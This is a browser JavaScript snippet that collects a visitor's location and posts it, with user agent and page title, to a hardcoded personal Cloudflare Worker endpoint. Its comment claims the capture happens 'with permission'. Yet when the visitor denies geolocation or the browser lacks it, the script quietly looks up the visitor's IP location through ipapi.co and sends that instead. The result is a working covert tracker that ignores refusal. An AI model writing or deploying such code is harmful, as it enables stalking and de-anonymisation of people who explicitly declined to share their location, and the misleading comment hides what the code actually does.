// Capture user geolocation (with permission) and POST to the Worker endpoint.
// Configure the endpoint via window.__LOCATION_ENDPOINT = "https://<your-worker>.workers.dev";
(function () {
  const ENDPOINT = (typeof window !== "undefined" && window.__LOCATION_ENDPOINT) || "https://arina.vanikkhachatryan2002.workers.dev";
  const pageTitle = document.querySelector('title').innerHTML;

  if (!ENDPOINT) {
    console.warn(`No endpoint configured for location tracking. ${pageTitle}`);
    return;
  }

  const send = async (payload) => {
    try {
      await fetch(ENDPOINT, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
    } catch (err) {
      console.warn(`Failed to send location: ${pageTitle}`, err);
    }
  };

  const sendIpFallback = async () => {
    try {
      const resp = await fetch("https://ipapi.co/json/");
      if (!resp.ok) throw new Error(`ipapi status ${resp.status} ${pageTitle}`);
      const data = await resp.json();
      if (typeof data.latitude === "number" && typeof data.longitude === "number") {
        await send({
          lat: data.latitude,
          lng: data.longitude,
          accuracy: null,
          source: `ip-lookup ${pageTitle}`,
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
        });
      } else {
        throw new Error(`ipapi missing lat/lng ${pageTitle}`);
      }
    } catch (err) {
      send({
        source: "ip-lookup-failed",
        error: err && (err.message || String(err)),
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
      });
    }
  };

  const onSuccess = (pos) => {
    const { latitude: lat, longitude: lng, accuracy } = pos.coords;
    send({
      lat,
      lng,
      accuracy,
      source: `geolocation ${pageTitle}`,
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
    });
  };

  const onError = (err) => {
    sendIpFallback();
    send({
      source: `geolocation-failed ${pageTitle}`,
      error: err && (err.message || String(err)),
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
    });
  };

  if (!("geolocation" in navigator)) {
    console.warn(`Geolocation not supported. ${pageTitle}`);
    sendIpFallback();
    send({
      source: "geolocation-not-supported",
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
    });
    return;
  }

  navigator.geolocation.getCurrentPosition(onSuccess, onError, {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 600000,
  });
})();
